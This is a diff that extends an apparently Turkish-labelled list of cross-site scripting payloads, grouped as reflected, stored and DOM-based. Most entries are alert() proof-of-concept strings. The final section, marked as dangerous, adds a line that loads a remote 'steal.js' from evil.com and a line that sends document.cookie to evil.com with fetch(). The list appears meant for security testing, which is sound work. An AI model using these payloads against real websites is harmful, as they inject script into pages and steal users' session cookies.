@@ -1,3 +1,32 @@
+#####################################
+# 🧪 Reflected XSS Payloadları
+#####################################
+
 <script>alert('XSS')</script>
 "><img src=x onerror=alert(1)>
 <svg/onload=alert(1)>
+<iframe src="javascript:alert('XSS')"></iframe>
+' onmouseover='alert("XSS")
+
+#####################################
+# 🧪 Stored XSS Payloadları
+#####################################
+
+<script>alert('Stored XSS')</script>
+<marquee><img src=x onerror=alert('Stored XSS')></marquee>
+<textarea autofocus onfocus=alert('Stored')></textarea>
+
+#####################################
+# 🧪 DOM-Based XSS Payloadları
+#####################################
+
+<a href="javascript:alert('DOM')">Click Me</a>
+"><script>location='javascript:alert(1)'</script>
+document.location="javascript:alert('DOM XSS')"
+
+#####################################
+# ⚠️ Tehlikeli ve dikkatli kullanılmalı
+#####################################
+
+<script src="http://evil.com/steal.js"></script>
+<img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)">
